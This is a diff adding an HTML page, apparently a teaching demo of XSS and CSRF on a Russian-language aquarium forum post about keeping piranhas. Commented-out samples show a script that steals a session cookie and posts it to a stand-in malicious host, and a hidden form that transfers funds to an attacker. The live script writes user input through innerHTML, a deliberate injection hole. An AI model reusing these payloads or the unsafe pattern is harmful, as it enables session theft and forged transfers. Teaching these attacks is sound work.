@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+</head>
+<body>
+  <form id="basic-form">
+    <input id="user-name" type="text">
+    <input type="submit" value="Отправить" placeholder="Пожалуйста, представьтесь">
+    <p id="welcome-user"></p>
+  </form>
+  <h1>Здравствуйте, <span class="username">Обычный Пользователь</span>!</h1>
+  <article class="topic">
+    <header class="topic-header">
+      <h2>Разведение пираний в домашних условиях</h2>
+    </header>
+    <p class="topic-body">
+      Всем привет. Я решил завести себе пираний. 
+      Расскажите, какие плюсы, минусы, подводные камни.
+    </p>
+    <footer class="posted-by">
+      <!-- Вместо имени можно вставить код -->
+      <!-- От <span class="poster-name">Другой пользователь</span><script>const username=document.querySelector('.username').textContent;const sessionCookie=document.cookie.match(/session-token=([^;$]+)/)[1];fetch(`http:/www.malicious-site.com`,{method: 'post',body:JSON.stringify({username,sessionCookie})});</script> -->
+    </footer>
+  </article>
+  <form action="/transfer" method="post">
+    <label for="amount">Количество рыбокойнов</label>
+    <input type="number" id="amount" name="amount">
+    <label for="target-user">Получатель</label>
+    <input type="text" id="target-user" name="target-user">
+    <input type="submit" value="Перевести рыбокойны">
+  </form>
+  <!-- CSRF (Cross-Site Request Forgery) -->
+  <!-- <img src="tetradon.jpg">
+  <p>Лайк, если хочешь такую в свой аквариум</p>
+  <form action="http://www.aquarium-forum.com/transfer"  method="post">
+    <input type="hidden" name="amount" value="100500">
+    <input type="hidden" name="target-user" value="hacker_nickname">
+    <input type="submit" value="Лайк!">
+  </form> -->
+  <script>
+    'use strict';
+
+    const submitFormHandler = (evt) => {
+        evt.preventDefault();
+        welcomeUserElement.innerHTML = `Привет, ${userNameElement.value}!`;
+    }
+
+    const formElement = document.querySelector(`#basic-form`);
+    const welcomeUserElement = formElement.querySelector(`#welcome-user`);
+    const userNameElement = formElement.querySelector(`#user-name`);
+
+    formElement.addEventListener(`submit`, submitFormHandler);
+  </script>
+</body>
+</html>
